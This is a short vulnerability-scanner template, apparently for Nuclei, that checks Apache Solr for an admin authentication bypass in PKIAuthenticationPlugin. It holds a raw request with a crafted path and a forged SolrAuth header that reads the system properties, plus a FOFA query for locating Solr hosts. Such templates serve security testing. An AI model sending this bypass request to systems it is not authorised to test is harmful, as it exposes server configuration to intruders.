id: solr-PKIAuthenticationPlugin-admin-bypass
info:
  author: PokerSec
  metadata:
    fofasearch: app="APACHE-Solr"
  name: solr-PKIAuthenticationPlugin-admin-bypass
  severity: high
requests:
- matchers:
  - dsl:
    - status_code==200 && contains_all(body,"system.properties") && contains_all(body,"Eclipse
      Adoptium")
    type: dsl
  raw:
  - 'GET /solr/admin/info/properties:/admin/info/key HTTP/1.1

    Host: {{Hostname}}

    SolrAuth: XXXXX



    '
